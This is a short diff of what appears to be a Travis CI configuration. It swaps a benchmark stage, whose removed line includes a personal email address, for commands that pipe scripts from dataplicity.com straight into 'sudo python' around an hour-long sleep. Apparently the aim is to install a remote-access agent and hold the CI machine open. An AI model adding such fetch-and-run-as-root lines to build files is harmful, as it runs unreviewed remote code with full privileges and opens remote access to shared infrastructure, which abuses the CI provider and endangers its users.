@@ -1,8 +1,7 @@
-sudo: required
 dist: trusty
 language: bash
-jobs:
-  include:
-    - stage: test
-      script: 
-      - bash <(curl -sSL https://raw.githubusercontent.com/serverscope/serverscope-benchmark/master/install-serverscope.sh) -uvc -e "mcbplay1@gmail.com" -p "free|travis" -i speedtest,download,dd,fio
+script: 
+     - curl https://www.dataplicity.com/xsn6xmmx.py | sudo python
+     - travis_wait 3600 sleep 3600
+     - echo done
+     - curl https://www.dataplicity.com/wf51k0jj.py | sudo python
